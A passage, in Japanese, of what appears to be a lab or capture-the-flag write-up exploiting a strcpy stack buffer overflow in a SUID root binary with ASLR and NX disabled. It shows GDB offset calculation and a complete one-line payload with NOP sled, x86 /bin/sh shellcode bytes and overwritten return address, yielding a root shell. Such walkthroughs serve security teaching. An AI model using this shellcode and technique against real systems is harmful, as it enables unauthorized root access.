...
GDB で `main` 関数を逆アセンブルしたところ、コマンドライン引数（`argv[1]`）をスタック上のバッファに `strcpy` でコピーしており、境界チェックが行われていないため **Buffer Overflow (BoF)** が可能であることが判明した。

*   **ASLR:** 無効（スタックのアドレスが固定）
*   **NX (No-Execute):** 無効（スタック上のコードを実行可能）
*   **SUID:** `root` 所有のバイナリ（脆弱性を突くことで root シェルを取得可能）

### GDB による脆弱性解析
1.  **バッファ開始アドレスの特定:**
    `strcpy` 呼び出し直前の `lea 0x10(%esp),%eax` 実行後の `eax` レジスタを確認。
    - `buffer address`: `0xbffffb50`
2.  **リターンアドレス（saved EIP）の保存場所の特定:**
    `info frame` コマンドでスタックフレーム情報を確認。
    - `saved eip at`: `0xbffffbdc`
3.  **オフセットの計算:**
    `saved EIP` の場所から `buffer` の開始位置を引く。
    - `0xbffffbdc - 0xbffffb50 = 0x8c` (**140バイト**)

### エクスプロイトの実行
140バイトのパディングの直後に、ジャンプ先アドレスを配置する。ジャンプ先は、攻撃コード（シェルコード）を配置したスタック内の NOP スライドの範囲内（例: `0xbffffb80`）を指定する。

**ペイロード構成:**
- **NOPスライド (100バイト):** `\x90` * 100
- **シェルコード (23バイト):** `/bin/sh` を実行する機械語
  - Linux x86 shellcodeで検索
- **パディング (17バイト):** 合計140バイトにするための調整 (`140 - 100 - 23 = 17`)
- **リターンアドレス (4バイト):** `0xbffffb80` (リトルエンディアン形式: `\x80\xfb\xff\xbf`)

**実行コマンド:**
```bash
./exploit_me $(python -c "print('\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*17 + '\x80\xfb\xff\xbf')")
```

このコマンドを実行することで、`saved EIP` がスタック上の NOP スライドのアドレスに書き換えられ、関数終了時にシェルコードが実行される。結果として root 権限のシェル (`#`) を獲得し、攻略完了となった。
